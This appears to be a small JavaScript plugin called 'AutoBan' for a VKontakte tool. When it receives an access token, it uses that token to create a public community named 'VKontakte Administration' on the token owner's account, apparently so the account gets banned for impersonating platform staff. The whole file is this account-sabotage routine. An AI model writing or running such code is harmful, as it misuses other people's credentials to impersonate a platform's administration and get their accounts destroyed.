import { VK } from "vk-io";

export const name = "AutoBan";

/**
 *
 * @param {*} _
 * @param {import("events").EventEmitter} ee
 */
export function init(_, ee) {
  ee.on("ban:token", async ({ token }) => {
    const vk = new VK({ token });

    await vk.api.groups.create({
      title: "Администрация ВКонтакте",
      type: "public",
      public_category: 1,
      subtype: 1
    });
  });
}
